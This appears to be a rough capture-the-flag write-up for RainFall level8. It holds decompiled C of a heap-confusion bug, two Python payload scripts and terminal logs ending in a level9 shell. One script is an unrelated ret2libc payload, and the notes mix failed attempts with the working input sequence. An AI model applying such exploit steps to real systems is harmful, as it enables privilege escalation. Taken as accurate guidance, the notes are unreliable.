LEVEL_8:
# 📚 Exploiting `level8` 

```
int		main(void)
{
	char	buffer[128];
	
	while (1)
	{
		printf("%p, %p\n", auth, service);
		if (fgets(buffer, 128, stdin) == 0)
			break;
		if (strncmp(buffer, "auth ", 4) == 0)
		{
			auth = malloc(4);
			auth[0] = 0;
			if (strlen(buffer + 5) <= 30)
				strcpy(auth, buffer + 5);
		}
		if (strncmp(buffer, "reset", 5) == 0)
			free(auth);
		if (strncmp(buffer, "service", 6) == 0)
			service = strdup(buffer + 7);
		if (strncmp(buffer, "login", 5) == 0)
		{
			if (auth[32] != 0)
				system("/bin/sh");
			else
				fwrite("Password:\n", 10, 1, stdout);
		}
	}
}
python - <<PY > /tmp/exploit
from struct import pack
OFF = 80            
system = 0xb7e6b060
ret_after_system = 0x41414141   # junk or address of exit()
binsh = 0xb7f8cc58

payload = b"A"*OFF
payload += pack("<I", system)
payload += pack("<I", ret_after_system)
payload += pack("<I", binsh)
payload += b"\n"
open("/tmp/exploit","wb").write(payload)
print("wrote /tmp/exploit, len=", len(payload))
PY


#!/usr/bin/env python3
payload = b"auth AAAAAAAAAAAAAAAAAAAAAAAAAAAXXXX\n"
payload += b"login\n"
open("/tmp/exploit", "wb").write(payload)
print("wrote /tmp/exploit, len=", len(payload))

level8@RainFall:~$ ./level8 < /tmp/exploit
(nil), (nil)
0x804a008, (nil)
0x804a008, 0x804a018
Password:
0x804a008, 0x804a018
level8@RainFall:~$ cat /proc/sys/kernel/randomize_va_space
0
level8@RainFall:~$ (echo "auth AAAAAAAAAAAAAAAAAAAAAAAAAAAXXXX"; echo "login") | ./level8
(nil), (nil)
0x804a008, (nil)
Password:
0x804a008, (nil)
level8@RainFall:~$

level8@RainFall:~$ ./level8
(nil), (nil)
auth
(nil), (nil)
auth
0x804a008, (nil)
service0123456789abcdef
0x804a008, 0x804a018
login
$ whoami
level9
$ ^C
$ ^X^Z^Z^C
$ exit
0x804a008, 0x804a018
exit
0x804a008, 0x804a018
^C
level8@RainFall:~$ ./level8
(nil), (nil)
auth
(nil), (nil)
authx
(nil), (nil)
authrr
(nil), (nil)
authuuuu
(nil), (nil)
auth
(nil), (nil)
auth
0x804a008, (nil)
service0123456789
0x804a008, 0x804a018
login
Password:
0x804a008, 0x804a018
kaka
0x804a008, 0x804a018
whoami
0x804a008, 0x804a018
^C
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service
0x804a008, 0x804a018
login
Password:
0x804a008, 0x804a018
^C
level8@RainFall:~$ clear
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service0123456789abcdef
0x804a008, 0x804a018
login
$ whoami
level9
```